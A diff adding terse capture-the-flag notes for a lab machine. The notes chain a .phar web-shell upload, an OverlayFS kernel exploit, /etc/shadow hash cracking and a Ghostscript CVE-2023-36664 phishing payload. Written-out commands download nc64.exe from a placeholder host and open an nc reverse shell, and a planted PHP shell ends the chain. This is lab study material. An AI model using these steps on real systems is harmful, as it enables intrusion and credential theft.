@@ -1,0 +1,19 @@
+
+--------Foothold
+website8080 -> register
+uploads -> image - .phar -> pownyshell -> revshell 
+--------User
+find / -perm -u=s -type -f 2>/dev/null -> fail
+uname -r -> overlay cve -> https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 -> root
+root -> /etc/shadow -> hash
+hashcat hash.txt rockyou -> crack drwilliams password
+access login webserver443 with drwilliams -> mailing phising scenario
+ghostscript cve -> https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
+python3 CVE_2023_36664_exploit.py --inject --payload "curl <ip>:<port>/nc64.exe -o nc.exe" --filename file.eps -> to download automatically nc.exe
+python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 4444 -e cmd.exe" --filename file.eps -> to execute reverse shell
+get the userflag
+---------Root
+type Documents\ghostscript.bat -> drbrown password
+rpcclient -U "drbrown" <ip>
+rpcclient $> querydispinfo -> Administrator information is shared with the Guest
+ponyshell on xampp\htdocs -> browser https://<target>/shell.php -> get root flag
